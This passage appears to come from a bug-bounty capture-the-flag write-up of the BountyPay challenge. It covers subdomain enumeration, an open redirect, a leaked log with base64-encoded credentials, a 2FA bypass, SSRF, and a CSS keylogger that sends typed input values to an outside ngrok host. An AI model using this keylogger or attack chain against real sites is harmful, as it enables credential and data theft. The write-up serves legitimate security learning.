and logged in by passing the 2FA from step 3. \n\n### Step 14 - SSRF\n\nAs mentioned at the beginning, I knew that I was suppose to find a way to make May 2020's payments, so I directly loaded this date and got the payment button: \n\n{F861124}\n\nI clicked next and saw an interesting hidden input which was using a .css URL: \n\n{F861123}\n\nI replaced this URL with my own URL using ngrok, and started to play with that. I assumed the following: \n\n- It had something to do with the 2FA application.\n- It had a hint within the original css file. \n\n\u003e Template for the UNI 2FA App\n\n- The css was loaded somewhere else by the server.\n\n\n### Step 15 - CSS Keylogger via SSRF\n\nAfter playing around I [read about a way to create a CSS KeyLogger](https://css-tricks.com/css-keylogger/) and implemented it by myself and it worked. However, I had a problem figuring out the order of the request, which made me create a very specific css, for example: \n\n```\ninput:first-child[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+\"); }\ninput:nth-child(2)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-2\"); }\ninput:nth-child(2)[value$=\" \"] { background-image: url(\"https://dd36dc8b7bc5.ngrok.io/+-3\"); }\ninput:nth-child(4)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-4\"); }\ninput:nth-child(5)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-5\"); }\ninput:nth-child(6)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-6\"); }\ninput:nth-child(7)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-7\"); }\ninput:nth-child(8)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-8\"); }\n```\n\nThis ended up with the following requests: \n\n{F861122}\n\nand that way I was able to find the flag:\n\n{F861142}\n\n## Impact\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThanks again for this great and long challenge! \n","markdown_message":"\u003ch2 id=\"tl-dr\"\u003eTL;DR\u003c/h2\u003e\n\n\u003cp\u003eFlag is: \u003ccode\u003e^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThank you for this awesome challenge! \u003c/p\u003e\n\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eI have participated in this CTF as I wanted to see how far I\u0026#39;d be able to get considering the fact that I\u0026#39;m doing bug bounty for a relatively short period of time. \u003c/p\u003e\n\n\u003cp\u003eComing from the software engineering world, I wanted to see how I\u0026#39;d be able to implement my thinking process and figure out as much as I can by myself.\u003c/p\u003e\n\n\u003ch2 id=\"tools\"\u003eTools\u003c/h2\u003e\n\n\u003cp\u003eI have used several tools during this process. You may find these tools in the following links:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003effuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for fuzzing.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA fast web fuzzer written in Go.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWord lists mainly from \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSecLists\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSecLists is the security tester\u0026#39;s companion. It\u0026#39;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpxb1988%2Fdex2jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edex2jar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ed2j-dex2jar: Convert .dex file to .class files (zipped as jar)\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fjava-decompiler.github.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJD-GUI\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eJD-GUI is a standalone graphical utility that displays Java source codes of ‚Äú.class‚Äù files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAndroid Studio\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAndroid Studio is the official integrated development environment for Google\u0026#39;s Android operating system, built on JetBrains\u0026#39; IntelliJ IDEA software and designed specifically for Android development. \u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fngrok.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003engrok\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ePublic URLs for building webhook integrations.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FEdu4rdSHL%2Ffindomain\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efindomain\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe fastest and cross-platform subdomain enumerator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eHackerOne has \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1266454022124376064%2Fphoto%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweeted\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWe need your help! CEO \u003cbr\u003e\n\u003ca href=\"/martenmickos\"\u003e@martenmickos\u003c/a\u003e\u003cbr\u003e\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? \u003ca title=\"https://hackerone.com/h1-ctf\" href=\"https://hackerone.com/h1-ctf\"\u003ehttps://hackerone.com/h1-ctf\u003c/a\u003e \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis meant that until there wasn\u0026#39;t a place to make a payment, the CTF wasn\u0026#39;t over. This kept me on track as every time I finished a step, as  I knew that I was on the right track but there was still something to be found. \u003c/p\u003e\n\n\u003ch2 id=\"steps\"\u003eSteps\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eReconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery).\u003c/li\u003e\n\u003cli\u003eOpen Redirect.\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Log File).\u003c/li\u003e\n\u003cli\u003eImproper Authorization (2FA Bypass).\u003c/li\u003e\n\u003cli\u003eSSRF (Via Cookie using Open Redirect).\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Directory Listing, In-house APK).\u003c/li\u003e\n\u003cli\u003eReverse Enginerring (APK).\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Twitter Account).\u003c/li\u003e\n\u003cli\u003eAuthentication Bypass (Creating Sandra\u0026#39;s user).\u003c/li\u003e\n\u003cli\u003e CSRF, Parameter Pollution, Privilege Escalation via CSRF (CSS Class, \u003ccode\u003etemplate\u003c/code\u003e parameter).\u003c/li\u003e\n\u003cli\u003e Information Disclosure (CEO username \u0026amp; password).\u003c/li\u003e\n\u003cli\u003e SSRF (Via \u003ccode\u003e.css\u003c/code\u003e file).\u003c/li\u003e\n\u003cli\u003e CSS Keylogger via SSRF.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"step-1-reconnaissance\"\u003eStep 1 - Reconnaissance\u003c/h3\u003e\n\n\u003ch4 id=\"subdomain-enumartion\"\u003eSubdomain Enumartion\u003c/h4\u003e\n\n\u003cp\u003eThe scope \u003ccode\u003e*.bountypay.h1ctf.com\u003c/code\u003e, mentioned at \u003ca title=\"https://hackerone.com/h1-ctf\" href=\"https://hackerone.com/h1-ctf\"\u003ehttps://hackerone.com/h1-ctf\u003c/a\u003e, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003efindomain \u003cspan class=\"nt\"\u003e-t\u003c/span\u003e bountypay.h1ctf.com\n\nTarget \u003cspan class=\"o\"\u003e==\u0026gt;\u003c/span\u003e bountypay.h1ctf.com\n\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Facebook API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Bufferover API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Threatminer API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe AnubisDB API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe CertSpotter API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Urlscan.io API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Threatcrowd API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Crtsh database API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Virustotal API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Sublist3r API... üîç\nSearching \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found \u003cspan class=\"k\"\u003efor \u003c/span\u003edomain bountypay.h1ctf.com üëΩ \u003cspan class=\"k\"\u003ein \u003c/span\u003e2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"understanding-the-application\"\u003eUnderstanding the Application\u003c/h4\u003e\n\n\u003cp\u003eI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e.  \u003c/p\u003e\n\n\u003ch4 id=\"content-discovery\"\u003eContent Discovery\u003c/h4\u003e\n\n\u003cp\u003eAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGET \u003ca title=\"https://app.bountypay.h1ctf.com/cgit\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fcgit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/cgit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://app.bountypay.h1ctf.com/.git\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com/api\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fapi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/api\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com/api/staff\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fapi%2Fstaff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/api/staff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com//api/accounts/\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2F%2Fapi%2Faccounts%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com//api/accounts/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;word\u0026gt;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"step-2-open-redirect\"\u003eStep 2 - Open Redirect\u003c/h3\u003e\n\n\u003cp\u003eWhile doing my recon, I saw that \u003ca title=\"https://api.bountypay.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as an open redirect on the main page: \u003ca title=\"https://api.bountypay.h1ctf.com/redirect?url=\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fredirect%3Furl%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/redirect?url=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\u003c/p\u003e\n\n\u003ch4 id=\"step-3-information-disclosure-log-file\"\u003eStep 3 - Information Disclosure (Log File)\u003c/h4\u003e\n\n\u003cp\u003eScanning the \u003ccode\u003ecgit\u003c/code\u003e directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003ehttpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq \u003cspan class=\"s1\"\u003e\u0026#39;.results[]\u0026#39;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;input\u0026quot;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;FUZZ\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;config\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;position\u0026quot;\u003c/span\u003e: 97,\n  \u003cspan class=\"s2\"\u003e\u0026quot;status\u0026quot;\u003c/span\u003e: 200,\n  \u003cspan class=\"s2\"\u003e\u0026quot;length\u0026quot;\u003c/span\u003e: 278,\n  \u003cspan class=\"s2\"\u003e\u0026quot;words\u0026quot;\u003c/span\u003e: 19,\n  \u003cspan class=\"s2\"\u003e\u0026quot;lines\u0026quot;\u003c/span\u003e: 12,\n  \u003cspan class=\"s2\"\u003e\u0026quot;redirectlocation\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;https://app.bountypay.h1ctf.com/cgit/config\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;input\u0026quot;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;FUZZ\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;index\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;position\u0026quot;\u003c/span\u003e: 20,\n  \u003cspan class=\"s2\"\u003e\u0026quot;status\u0026quot;\u003c/span\u003e: 200,\n  \u003cspan class=\"s2\"\u003e\u0026quot;length\u0026quot;\u003c/span\u003e: 0,\n  \u003cspan class=\"s2\"\u003e\u0026quot;words\u0026quot;\u003c/span\u003e: 1,\n  \u003cspan class=\"s2\"\u003e\u0026quot;lines\u0026quot;\u003c/span\u003e: 1,\n  \u003cspan class=\"s2\"\u003e\u0026quot;redirectlocation\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;https://app.bountypay.h1ctf.com/cgit/index\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;input\u0026quot;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s2\"\u003e\u0026quot;FUZZ\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;position\u0026quot;\u003c/span\u003e: 3838,\n  \u003cspan class=\"s2\"\u003e\u0026quot;status\u0026quot;\u003c/span\u003e: 200,\n  \u003cspan class=\"s2\"\u003e\u0026quot;length\u0026quot;\u003c/span\u003e: 73,\n  \u003cspan class=\"s2\"\u003e\u0026quot;words\u0026quot;\u003c/span\u003e: 10,\n  \u003cspan class=\"s2\"\u003e\u0026quot;lines\u0026quot;\u003c/span\u003e: 2,\n  \u003cspan class=\"s2\"\u003e\u0026quot;redirectlocation\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e,\n  \u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;https://app.bountypay.h1ctf.com/cgit/description\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking into these files, I have found  \u003ca title=\"https://app.bountypay.h1ctf.com/cgit/config\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fcgit%2Fconfig\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/cgit/config\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e exposed a github repository: \u003ca title=\"https://github.com/bounty-pay-code/request-logger.git\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/bounty-pay-code/request-logger.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which contained one file \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger%2Fblob%2Fmaster%2Flogger.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elogger.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that showed me the way to the next step: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;IP\u0026#39;\u003c/span\u003e        \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REMOTE_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;METHOD\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;PARAMS\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003efile_put_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bp_web_trace.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;U\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eFILE_APPEND\u003c/span\u003e   \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/bp_web_trace.log\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e log file contained the following base64 decoded strings: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\